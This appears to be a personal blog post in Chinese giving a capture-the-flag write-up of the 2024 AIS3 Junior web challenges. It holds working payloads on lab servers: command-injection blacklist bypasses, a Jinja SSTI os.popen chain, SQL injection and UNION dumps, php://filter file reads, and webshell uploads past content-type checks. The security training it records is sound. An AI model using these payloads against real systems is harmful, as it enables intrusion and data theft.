@@ -1,0 +1,1438 @@
+<!DOCTYPE html>
+<html lang="zh-tw" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="AIS3 Junior Web Writeup BAC01 看到輸入框隨便填個 1 看看\n發現上面是 user\n改個 admin 試看看\nFLAG：AIS3_Junior{FirstBROKENAccessControl;)}\n">
+
+<title>阿公のBlog</title><title>2024 AIS3 Junior WebㄉWriteup</title>
+
+<link rel='canonical' href='http://localhost:1313/en/post/2024-ais3-junior-web%E3%84%89writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="2024 AIS3 Junior WebㄉWriteup">
+<meta property='og:description' content="AIS3 Junior Web Writeup BAC01 看到輸入框隨便填個 1 看看\n發現上面是 user\n改個 admin 試看看\nFLAG：AIS3_Junior{FirstBROKENAccessControl;)}\n">
+<meta property='og:url' content='http://localhost:1313/en/post/2024-ais3-junior-web%E3%84%89writeup/'>
+<meta property='og:site_name' content='阿公のBlog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='2024' /><meta property='article:published_time' content='2024-08-18T00:00:00&#43;08:00'/><meta property='article:modified_time' content='2024-08-18T00:00:00&#43;08:00'/>
+<meta name="twitter:title" content="2024 AIS3 Junior WebㄉWriteup">
+<meta name="twitter:description" content="AIS3 Junior Web Writeup BAC01 看到輸入框隨便填個 1 看看\n發現上面是 user\n改個 admin 試看看\nFLAG：AIS3_Junior{FirstBROKENAccessControl;)}\n">
+    <link rel="shortcut icon" href="/img/new-avatar.PNG" />
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-ELVEGJD750"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-ELVEGJD750');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "2024 AIS3 Junior WebㄉWriteup",
+  "url": "http:\/\/localhost:1313\/en\/post\/2024-ais3-junior-web%E3%84%89writeup\/",
+  "datePublished": "2024-08-18T00:00:00\u002b08:00",
+  "dateModified": "2024-08-18T00:00:00\u002b08:00",
+  
+  
+  "keywords": "[2024]",
+  "inLanguage": "zh-tw",
+  "author": {
+    "@type": "Person",
+    "name": "",
+    "url": "http:\/\/localhost:1313\/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": ""
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http:\/\/localhost:1313\/en\/post\/2024-ais3-junior-web%E3%84%89writeup\/"
+  }
+}
+</script>
+
+
+
+<meta name="description" content="">
+<meta name="author" content="">
+
+<meta name="keywords" content="2024">
+
+
+
+<link rel="canonical" href="http://localhost:1313/en/post/2024-ais3-junior-web%E3%84%89writeup/">
+
+
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切換選單">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/new-avatar_hu_a21375ee9691e2f1.PNG" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🧑‍🦳</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">阿公のBlog</a></h1>
+            <h2 class="site-description">Hi, I&#39;m Chun-Hao Chung Welcome to my Blog</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主頁</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E9%97%9C%E6%96%BC/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>關於</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>封存</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜尋</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E9%80%A3%E7%B5%90/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>連結</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/en/" >English</option>
+                                
+                                    <option value="http://localhost:1313/" selected>中文</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>夜晚模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目錄</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#bac01">BAC01</a></li>
+    <li><a href="#bac02">BAC02</a></li>
+    <li><a href="#bac03">BAC03</a></li>
+    <li><a href="#fil01">FIL01</a></li>
+    <li><a href="#fil02">FIL02</a></li>
+    <li><a href="#lfi01">LFI01</a></li>
+    <li><a href="#lfi02">LFI02</a></li>
+    <li><a href="#xss01">XSS01</a></li>
+    <li><a href="#cmd01">CMD01</a></li>
+    <li><a href="#cmd02">CMD02</a></li>
+    <li><a href="#cmd03">CMD03</a></li>
+    <li><a href="#cmd04">CMD04</a></li>
+    <li><a href="#cmd06">CMD06</a></li>
+    <li><a href="#sql01">SQL01</a></li>
+    <li><a href="#sql02">SQL02</a></li>
+    <li><a href="#sti01">STI01</a></li>
+    <li><a href="#sti02">STI02</a></li>
+    <li><a href="#srf01">SRF01</a></li>
+    <li><a href="#srf02">SRF02</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/security/" >
+                Security
+            </a>
+        
+            <a href="/categories/ais3/" >
+                AIS3
+            </a>
+        
+            <a href="/categories/writeup/" >
+                Writeup
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/en/post/2024-ais3-junior-web%E3%84%89writeup/">2024 AIS3 Junior WebㄉWriteup</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 18, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    閱讀時間: 5 分鐘
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+        <footer class="article-translations">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+            <div>
+                
+                    <a href="http://localhost:1313/en/post/2024-ais3-junior-webs-writeup/" class="link">English</a>
+                
+            </div>
+        </footer>
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="ais3-junior-web-writeup">AIS3 Junior Web Writeup
+</h1><h2 id="bac01">BAC01
+</h2><p>看到輸入框隨便填個 1 看看</p>
+<p><img src="https://hackmd.io/_uploads/BknBuHncA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>發現上面是 user<br>
+改個 admin 試看看</p>
+<p><img src="https://hackmd.io/_uploads/B1-1YB25A.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{FirstBROKENAccessControl;)}</code></p></blockquote>
+<h2 id="bac02">BAC02
+</h2><p><img src="https://hackmd.io/_uploads/H1btFH29R.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>先把上面連結點看看</p>
+<p><img src="https://hackmd.io/_uploads/Bk8sYBh50.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>到這裡一樣看一看</p>
+<p><img src="https://hackmd.io/_uploads/B1npFH2qC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="https://hackmd.io/_uploads/HJ_xqSh5C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>發現一個 3，一個 5，那 4 在哪</p>
+<p><img src="https://hackmd.io/_uploads/HJ_7cB25R.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>4 就是答案</p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{BroJustFoundBabyIDORVulnerability}</code></p></blockquote>
+<h2 id="bac03">BAC03
+</h2><p><img src="https://hackmd.io/_uploads/By25nXRqC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>一開始丟個 1 看看</p>
+<p><img src="https://hackmd.io/_uploads/SJy6hm09C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>注意上面的網址是 user<br>
+有 user 就有 admin<br>
+改成 admin 看看</p>
+<p><img src="https://hackmd.io/_uploads/BJqHTQC5A.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>奇怪了怎麼變成了 error<br>
+那用 curl 指令看看</p>
+<p><img src="https://hackmd.io/_uploads/rJoyRXAq0.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="https://hackmd.io/_uploads/SyigRQC5C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{BabyBRokenAccEssControoooooool}</code></p></blockquote>
+<h2 id="fil01">FIL01
+</h2><p>打開網站只有這個最有可能有漏洞的地方</p>
+<p><img src="https://hackmd.io/_uploads/H11SFI3cC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>寫一個能 touch 到主機的 php 並上傳</p>
+<p><img src="https://hackmd.io/_uploads/r1HcYLncR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="https://hackmd.io/_uploads/H1_0Y82cR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>上傳完成</p>
+<p><img src="https://hackmd.io/_uploads/HyUw58nc0.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>把 URL 改成他給的位置<br>
+可以連到ㄟ<br>
+看看 ls</p>
+<p><img src="https://hackmd.io/_uploads/Bk-V2UnqR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>那 cat ../FLAG 看看</p>
+<p><img src="https://hackmd.io/_uploads/r1lEKhUn9R.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{FirstWEBSHELLXDDD}</code></p></blockquote>
+<h2 id="fil02">FIL02
+</h2><p>這題改用 Kali 然後開 Burp Suite</p>
+<p><img src="https://hackmd.io/_uploads/ry_58329R.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>一樣上傳上一題的 php 但要封包攔截</p>
+<p><img src="https://hackmd.io/_uploads/SJoJ_hncR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>點第二個 Send to Repeater 然後上面那排按 Repeater</p>
+<p><img src="https://hackmd.io/_uploads/Hyeduh3qA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><code>Content-Type: application/x-php</code>這排因為會擋 php<br>
+所以改成<code>Content-Type:/jpg</code>並 send 出去</p>
+<p><img src="https://hackmd.io/_uploads/HyYCyAn9C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>有 URL，所以接在網址後面試試</p>
+<p><img src="https://hackmd.io/_uploads/BkrflC2cC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>有連線，那加 ?cmd=ls 試試</p>
+<p><img src="https://hackmd.io/_uploads/ryUuWCh50.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>有東西那開始找 FLAG</p>
+<p><img src="https://hackmd.io/_uploads/rJMWMCnqA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{BabyUploadBypass}</code></p></blockquote>
+<h2 id="lfi01">LFI01
+</h2><p><img src="https://hackmd.io/_uploads/BkApRn2qC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>這題用簡報上教到的方法<br>
+把網址<code>http://ctfd-ais3.crazyfirelee.tw:9021/</code>改成<br>
+<code>http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&amp;file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p><img src="https://hackmd.io/_uploads/rkgu1ahqR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>欸這東西看起來好醜喔，最後也有==</p>
+<p>把它 base64 decode 看看</p>
+<p><img src="https://hackmd.io/_uploads/ryDkxan9A.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>帳號是:admin<br>
+密碼是:CATLOVEBITCOINMEOWMEOW<br>
+送回去登入</p>
+<p><img src="https://hackmd.io/_uploads/S1rSganqA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{php://filter/BabyPHPLFI.b64decode()}</code></p></blockquote>
+<h2 id="lfi02">LFI02
+</h2><p>找到唯一能與後端交互的地方</p>
+<p><img src="https://hackmd.io/_uploads/BkBhjThcA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>一樣上傳 FIL01 和 FIL02 的 php</p>
+<p><img src="https://hackmd.io/_uploads/B1G4np35C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>這不是 URL 嗎?前面的 Update 網頁有<code>form=form.html</code><br>
+填進去試看看<br>
+所以會是<br>
+<code>http://ctfd-ais3.crazyfirelee.tw:9022/post.php?form=/tmp/c3644_108.160.138.201.php</code></p>
+<p><img src="https://hackmd.io/_uploads/HkoLpTn9A.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>然後就加 &amp;cmd=ls 看看</p>
+<p><img src="https://hackmd.io/_uploads/HyhWCT29C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>找到 FLAG 了 CAT 它</p>
+<p><img src="https://hackmd.io/_uploads/HJFHC63qC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{../../../../tmp/BADBAD.php?LFI=SUCCESS}</code></p></blockquote>
+<h2 id="xss01">XSS01
+</h2><p><img src="https://hackmd.io/_uploads/rJT4IL25C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>都說了是 XSS 先試看看<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p><img src="https://hackmd.io/_uploads/Skp_PU390.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>確認有 XSS 漏洞就 alert(FLAG) 看看</p>
+<p><img src="https://hackmd.io/_uploads/BJKluI3qR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{XSSXSSXSSXSS}</code></p></blockquote>
+<h2 id="cmd01">CMD01
+</h2><p>照題意先 ping 看看</p>
+<p><img src="https://hackmd.io/_uploads/r1UAhPnc0.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>欸這不就是終端機嗎?<br>
+那 ls 看看</p>
+<p><img src="https://hackmd.io/_uploads/H1od6v35C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>再來 cat flag 就出來了</p>
+<p><img src="https://hackmd.io/_uploads/SyNn6v390.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{BabyCommand;InjectionXDDDddddd}</code></p></blockquote>
+<h2 id="cmd02">CMD02
+</h2><p>這題有黑名單，所以要繞過<br>
+把指令改成<code>ping ; c$()at FLAG</code></p>
+<p><img src="https://hackmd.io/_uploads/ByVNG_h9R.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>答案就出來了</p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{niceWordBL$()ACKListEvasion;)}</code></p></blockquote>
+<h2 id="cmd03">CMD03
+</h2><p>測試出這題是&amp;會被擋<br>
+所以改成<code>127.0.0.1|l''s</code></p>
+<p><img src="https://hackmd.io/_uploads/Skrzb4C5A.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><code>127.0.0.1|c''at${IFS}FLAG</code></p>
+<p><img src="https://hackmd.io/_uploads/B1VwbV0qC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{BashOperato|rEvasion${IFS}SUCC|ESSFUL|:DDDDD}</code></p></blockquote>
+<h2 id="cmd04">CMD04
+</h2><p><img src="https://hackmd.io/_uploads/HJMOXVRcA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>只要是個指令就會 EVERY THING IS GOOD<br>
+那用<code>l''s</code>執行 ls 試試</p>
+<p><img src="https://hackmd.io/_uploads/BJwYEV090.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>還是錯誤，多試後發現可以<code>&quot;`l''s`&quot;</code></p>
+<p><img src="https://hackmd.io/_uploads/HyK0EECc0.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>就<code>&quot;`c''at${IFS}ERRORCMDi_FLAG`&quot;</code></p>
+<p><img src="https://hackmd.io/_uploads/B1lbSVR90.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{E${IFS}RRORB3sed|$(CMDi)Succ3ss:DD}</code></p></blockquote>
+<h2 id="cmd06">CMD06
+</h2><p>測試出這題是:會被擋<br>
+所以換成<code>127.0.0.1&amp;&amp;l''s</code></p>
+<p><img src="https://hackmd.io/_uploads/HJZ4zECcR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>然後就<code>127.0.0.1&amp;&amp;c''at${IFS}FLAG</code></p>
+<p><img src="https://hackmd.io/_uploads/BkZemECcC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{ouo_hihi}</code></p></blockquote>
+<h2 id="sql01">SQL01
+</h2><p>這題就用 SQL 語法 admin&rsquo; or 1=1 然後後面&ndash;註解掉就好<br>
+密碼因為註解掉了所以隨便填就好</p>
+<p><img src="https://hackmd.io/_uploads/HJ70BT2q0.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="https://hackmd.io/_uploads/SJyHITh9R.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{SQL'InjectionXDorD=D_--_-}</code></p></blockquote>
+<h2 id="sql02">SQL02
+</h2><p>一開始用 a 先看有多少資料庫</p>
+<p><img src="https://hackmd.io/_uploads/HyVrys6qA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>然後用<code>' order by 1-- // </code>查詢 column 層數</p>
+<p><img src="https://hackmd.io/_uploads/HJ_Rb3acA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>直到查到第五層</p>
+<p><img src="https://hackmd.io/_uploads/rkQxzhp5C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>然後用<code>' UNION SELECT 1,group_concat(schema_name),3,4 from information_schema.schemata#</code>查 detabase 的位置</p>
+<p><img src="https://hackmd.io/_uploads/Bksqf3T5A.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>看到了 ApexPredators<br>
+用<code>' UNION SELECT 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='ApexPredators' #</code>查ApexPredators</p>
+<p><img src="https://hackmd.io/_uploads/HJqcQnTq0.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>看到了 user 了<br>
+用<code>' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='ApexPredators' and table_name='users' #</code>查 users</p>
+<p><img src="https://hackmd.io/_uploads/rJ9842a50.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>然後用<code>' union select 1,username,password,isAdmin from ApexPredators.users#</code>查帳號內容</p>
+<p><img src="https://hackmd.io/_uploads/HJe8B3Tc0.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>找到了有 1 的 admin 帳號<br>
+帳號：KubenBlisk<br>
+密碼：BliskLeader#2024</p>
+<p><img src="https://hackmd.io/_uploads/SyQaHh65R.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{_BRO-DO_A--UNION_SELECTXDDD_--_-}</code></p></blockquote>
+<h2 id="sti01">STI01
+</h2><p>先試看看講師說的<code>{{ self.__init__.__globals__.__builtins__ }}</code></p>
+<p><img src="https://hackmd.io/_uploads/ryL4_a29A.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>看起來有 Template 漏洞<br>
+那試試<br>
+<code>{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}</code></p>
+<p><img src="https://hackmd.io/_uploads/BkWWtT2qA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>成功進去了，把 id 改成 ls 看會怎麼樣</p>
+<p><img src="https://hackmd.io/_uploads/BkcUFp3cC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>再把 ls 改成 cat FLAG 送出去</p>
+<p><img src="https://hackmd.io/_uploads/ByLctpn5R.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{.__JinjaTWOOOO.___[&quot;SSTI&quot;]__.succ3ssXDD.__}</code></p></blockquote>
+<h2 id="sti02">STI02
+</h2><p>這題不知道為什麼跟上一題一樣，只有 FLAG 不一樣<br>
+所以步驟跟上一題一樣</p>
+<p><img src="https://hackmd.io/_uploads/SyFU9635A.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{b4by__.filt3rEvasion.__Succ3ss}</code></p></blockquote>
+<h2 id="srf01">SRF01
+</h2><p>依照題意知道檔案在 /app/FLAG 底下<br>
+所以打出<code>file://127.0.0.1/app/FLAG</code></p>
+<p><img src="https://hackmd.io/_uploads/SJXzVJpqA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>進去後就找原始碼</p>
+<p><img src="https://hackmd.io/_uploads/HJY_Eka5C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
